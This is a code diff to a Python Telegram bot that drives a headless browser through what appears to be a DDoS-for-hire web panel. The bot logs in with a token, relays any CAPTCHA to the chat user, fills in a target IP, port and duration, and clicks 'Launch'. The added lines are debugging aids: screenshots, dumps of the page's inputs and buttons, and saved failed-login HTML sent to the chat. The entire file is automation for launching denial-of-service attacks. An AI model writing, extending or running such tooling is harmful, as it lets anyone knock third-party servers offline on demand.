@@ -54,28 +54,81 @@ def get_playwright_chromium_path():
 async def launch_attack_playwright(ip, port, duration, update, context):
     try:
         async with async_playwright() as p:
-            # Get Chromium path
             chromium_path = get_playwright_chromium_path()
             
-            # Launch browser
             if chromium_path:
-                browser = await p.chromium.launch(
-                    executablePath=chromium_path,
-                    headless=True
-                )
+                browser = await p.chromium.launch(executablePath=chromium_path, headless=True)
             else:
                 browser = await p.chromium.launch(headless=True)
             
             context_obj = await browser.new_context(viewport={'width': 1280, 'height': 720})
             page = await context_obj.new_page()
             
-            # ========== LOGIN SECTION ==========
+            # ========== LOGIN PAGE ==========
             print("🔑 Logging in...")
             await page.goto(LOGIN_URL, wait_until='networkidle')
             await page.wait_for_timeout(3000)
             
-            # Find token field
-            token_field = await page.query_selector('input[type="text"]')
+            # 🔥 DEBUG: Current URL
+            current_url = page.url
+            print(f"📍 Current URL: {current_url}")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=f"📍 Current URL: `{current_url}`"
+            )
+            
+            # 🔥 DEBUG: Saare elements check
+            all_inputs = await page.query_selector_all('input')
+            print(f"🔍 Total inputs on page: {len(all_inputs)}")
+            
+            for i, inp in enumerate(all_inputs):
+                input_type = await inp.get_attribute('type') or 'text'
+                input_name = await inp.get_attribute('name') or 'No name'
+                input_placeholder = await inp.get_attribute('placeholder') or 'No placeholder'
+                print(f"  Input {i}: type={input_type}, name={input_name}, placeholder={input_placeholder}")
+            
+            # 🔥 DEBUG: Saare buttons check
+            all_buttons = await page.query_selector_all('button')
+            print(f"🔍 Total buttons on page: {len(all_buttons)}")
+            
+            for i, btn in enumerate(all_buttons):
+                btn_text = await btn.text_content() or 'No text'
+                btn_class = await btn.get_attribute('class') or 'No class'
+                print(f"  Button {i}: text='{btn_text[:30]}', class='{btn_class[:30]}'")
+            
+            # 🔥 DEBUG: CAPTCHA check
+            captcha_input = await page.query_selector('input[name="captcha"]')
+            captcha_img = await page.query_selector('img[alt*="captcha"], img[src*="captcha"]')
+            
+            if captcha_input:
+                print("✅ CAPTCHA input found")
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text="✅ CAPTCHA input field detected"
+                )
+            
+            if captcha_img:
+                print("✅ CAPTCHA image found")
+                await context.bot.send_message(
+                    chat_id=update.effective_chat.id,
+                    text="✅ CAPTCHA image detected"
+                )
+            
+            # 🔥 DEBUG: Screenshot
+            await page.screenshot(path='debug_login.png')
+            await context.bot.send_photo(
+                chat_id=update.effective_chat.id,
+                photo=open('debug_login.png', 'rb'),
+                caption="📸 Login page screenshot"
+            )
+            
+            # Ab token field find karo
+            token_field = None
+            for inp in all_inputs:
+                if await inp.get_attribute('type') == 'text':
+                    token_field = inp
+                    break
+            
             if not token_field:
                 await browser.close()
                 return False, "❌ Token field not found"
@@ -83,10 +136,7 @@ async def launch_attack_playwright(ip, port, duration, update, context):
             await token_field.fill(WEBSITE_TOKEN)
             print("✅ Token entered")
             
-            # ========== CHECK FOR CAPTCHA ==========
-            captcha_input = await page.query_selector('input[name="captcha"]')
-            captcha_img = await page.query_selector('img[alt*="captcha"], img[src*="captcha"]')
-            
+            # CAPTCHA handling agar ho to
             if captcha_input and captcha_img:
                 # CAPTCHA detected! Send to user
                 await context.bot.send_message(
@@ -112,12 +162,43 @@ async def launch_attack_playwright(ip, port, duration, update, context):
                 
                 return False, "CAPTCHA_REQUIRED"
             
-            # ========== NO CAPTCHA - CONTINUE LOGIN ==========
-            login_btn = await page.query_selector('button.bg-yellow-600')
+            # Find login button
+            login_btn = None
+            for btn in all_buttons:
+                btn_text = await btn.text_content() or ''
+                if 'login' in btn_text.lower() or 'sign in' in btn_text.lower():
+                    login_btn = btn
+                    break
+            
+            if not login_btn:
+                # Try by class
+                login_btn = await page.query_selector('button.bg-yellow-600')
+            
+            if not login_btn and all_buttons:
+                login_btn = all_buttons[0]  # First button as fallback
+            
             if login_btn:
                 await login_btn.click()
                 print("✅ Login button clicked")
                 await page.wait_for_timeout(5000)
+                
+                # 🔥 DEBUG: After login URL
+                after_login_url = page.url
+                print(f"📍 After login URL: {after_login_url}")
+                
+                if 'attack' not in after_login_url:
+                    # Login failed - show page source
+                    content = await page.content()
+                    with open("login_failed.html", "w", encoding="utf-8") as f:
+                        f.write(content)
+                    
+                    await context.bot.send_message(
+                        chat_id=update.effective_chat.id,
+                        text=f"❌ Login failed. Current URL: {after_login_url}\nCheck login_failed.html"
+                    )
+                    
+                    await browser.close()
+                    return False, "❌ Login failed"
             else:
                 await browser.close()
                 return False, "❌ Login button not found"
@@ -127,40 +208,50 @@ async def launch_attack_playwright(ip, port, duration, update, context):
             await page.goto(WEBSITE_URL, wait_until='networkidle')
             await page.wait_for_timeout(3000)
             
-            # ========== FILL ATTACK FORM ==========
-            inputs = await page.query_selector_all('input[type="text"]')
-            print(f"🔍 Found {len(inputs)} input fields")
+            # 🔥 DEBUG: Attack page URL
+            attack_url = page.url
+            print(f"📍 Attack page URL: {attack_url}")
             
-            if len(inputs) >= 3:
-                await inputs[0].fill(ip)
-                await inputs[1].fill(str(port))
-                await inputs[2].fill(str(duration))
+            # 🔥 DEBUG: Attack page screenshot
+            await page.screenshot(path='debug_attack.png')
+            await context.bot.send_photo(
+                chat_id=update.effective_chat.id,
+                photo=open('debug_attack.png', 'rb'),
+                caption="📸 Attack page screenshot"
+            )
+            
+            # ========== FILL ATTACK FORM ==========
+            attack_inputs = await page.query_selector_all('input[type="text"]')
+            print(f"🔍 Found {len(attack_inputs)} input fields on attack page")
+            
+            if len(attack_inputs) >= 3:
+                await attack_inputs[0].fill(ip)
+                await attack_inputs[1].fill(str(port))
+                await attack_inputs[2].fill(str(duration))
                 print("✅ Attack form filled")
             else:
                 await browser.close()
-                return False, f"❌ Only {len(inputs)} inputs found"
+                return False, f"❌ Only {len(attack_inputs)} inputs found on attack page"
             
             # ========== CLICK LAUNCH BUTTON ==========
             launch_btn = await page.query_selector('button:has-text("Launch")')
             if not launch_btn:
-                # Try alternative button selectors
-                buttons = await page.query_selector_all('button')
-                if buttons:
-                    launch_btn = buttons[-1]
+                attack_buttons = await page.query_selector_all('button')
+                if attack_buttons:
+                    launch_btn = attack_buttons[-1]
             
             if launch_btn:
                 await launch_btn.click()
                 print("✅ Launch button clicked")
                 
-                # Wait for attack to register
                 await page.wait_for_timeout(3000)
                 
                 # Check if attack started
                 page_content = await page.content()
-                if "attack started" in page_content.lower() or "launching" in page_content.lower():
-                    status = "ATTACK SENDING SOON"
+                if "attack started" in page_content.lower():
+                    status = "ATTACK LAUNCHED SUCCESSFULLY"
                 else:
-                    status = "ATTACK LAUNCHED"
+                    status = "ATTACK SENDING SOON"
                 
                 await browser.close()
                 return True, status
